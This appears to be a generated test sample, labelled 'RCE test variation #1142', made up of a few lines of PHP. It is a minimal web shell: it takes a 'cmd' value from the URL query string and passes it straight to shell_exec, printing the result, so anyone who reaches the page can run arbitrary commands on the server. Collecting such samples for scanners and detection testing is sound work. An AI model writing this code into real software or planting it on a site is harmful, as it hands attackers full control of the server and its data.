<?php
// RCE test variation #1142
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>